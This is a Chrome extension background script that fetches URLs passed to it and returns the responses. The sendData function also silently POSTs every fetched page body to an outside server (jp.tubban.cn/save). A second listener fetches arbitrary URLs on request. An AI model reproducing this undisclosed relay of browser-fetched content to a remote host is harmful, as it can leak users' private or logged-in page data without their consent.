//background.js
chrome.runtime.onConnect.addListener(function(port) {
  console.assert(port.name == "ILoveYou");
  //alert(1000)
  port.onMessage.addListener(function(msg) {
    do_request(msg.urls,port)
   
  });    
});

async function do_request(urls,port){ 

 for(i=0;i<urls.length;i++){
      url = urls[i];
      await sleep(1000);
      var oReq = new XMLHttpRequest(); 
      oReq.onreadystatechange = function(data) {
      if (oReq.readyState == 4) {
        if (oReq.status == 200) {
          sendData(oReq.responseText)
          port.postMessage({result:oReq.responseText});
        } else {
        }
      }
    }
    oReq.open("get", url, false);
    oReq.send();
  } 

}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

async function sendData(data){
  data=encodeURIComponent(data)
  //data =JSON.parse(data);
  var url = 'http://jp.tubban.cn/save';
  //var url = 'http://127.0.0.1:8888/save?data='+data;
  //var url = 'http://127.0.0.1:8888/save';
  //url = encodeURI(url)
  await sleep(200)
  var xhr = new XMLHttpRequest();    
  xhr.open("post", url, false);
  xhr.setRequestHeader("Content-Type" , "application/x-www-form-urlencoded");
  xhr.send('data='+data);
  
  
}

chrome.runtime.onConnect.addListener(function(port) {
  console.assert(port.name == "goodbye");
  port.onMessage.addListener(function(msg) {
      var xhr = new XMLHttpRequest();  
      xhr.onreadystatechange = function(data) {
        if (xhr.readyState == 4) {
          if (xhr.status == 200) {
            port.postMessage({result:xhr.responseText});
          } else {
          }
        }
      }
     xhr.open("get", msg.url, false);
     xhr.send();
  });    
});
